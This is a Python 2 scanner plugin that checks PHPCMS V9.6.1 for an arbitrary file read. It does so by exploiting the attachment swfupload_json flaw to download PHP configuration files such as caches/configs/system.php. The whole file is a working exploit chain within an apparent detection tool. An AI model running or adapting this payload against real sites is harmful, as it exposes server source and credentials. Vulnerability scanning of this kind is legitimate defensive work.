#!/usr/bin/env python
# coding: utf-8

import re
import urlparse

from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http,ob):
    result = []
    try:
        frame = ob.get('siteType')
        if frame and frame in ['jsp', 'asp', 'aspx']:
            return []

        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        path = ob.get('path', '/')
        if not path or path[-1] != '/':
            path += '/'
        get_site_id_path = 'index.php?m=wap&c=index&a=init&siteid=1'
        get_site_id_url = "%s://%s%s%s" % (scheme, domain, path, get_site_id_path)

        # 获取当前的siteid
        res, content = http.request(get_site_id_url, 'GET', headers=header)
        if res and res.get('status') == '200':
            g_cookie = res.get('set-cookie')

            site_id = re.findall("_siteid=([\w-]+)", g_cookie)[0]

            # 获取分配的att_json
            payload = 'index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26i%3D1%26m%3D1%26d%3D1%26modelid%3D2%26catid%3D6%26s%3Dcaches%2fconfigs%2fsystem.p%26f=hp%3%252%2*77C'

            vul_url = "%s://%s/%s" % (scheme, domain, payload)
            body = 'userid_flash=%s' % site_id
            res, content = http.request(vul_url, 'POST', body=body, headers=header)
            if res and res.get('status') == '200':
                g_cookie = res.get('set-cookie')

                g_attjson_cookie = re.findall("att_json=([\w-]+)", g_cookie)[0]

                # download
                new_payload = 'index.php?m=content&c=down&a=init&a_k=%s' % g_attjson_cookie
                vul_url = "%s://%s/%s" % (scheme, domain, new_payload)
                res, content = http.request(vul_url, 'GET', headers=header)
                if res and res.get('status') == '200':
                    download_url = re.findall('<a href="(.*)" ', content)[0]

                    download_url = urlparse.urljoin("%s://%s/" % (scheme, domain), 'index.php' + download_url)

                    res, content = http.request(download_url, 'GET', headers=header)
                    if res and res.get('status') == '200' and re.search(r'<\?php', content):
                        detail = 'PHPCMS V9.6.1 任意文件读取漏洞'
                        request = getRequest(download_url, domain=ob['domain'])
                        response = getResponse(res,content)
                        result.append(getRecord(ob, download_url, ob['level'], detail, request, response))

    except Exception, e:
        logger.error("File:php_cms_v9_6_1_file_trans.py, run_domain function :%s" % (str(e)))

    return result
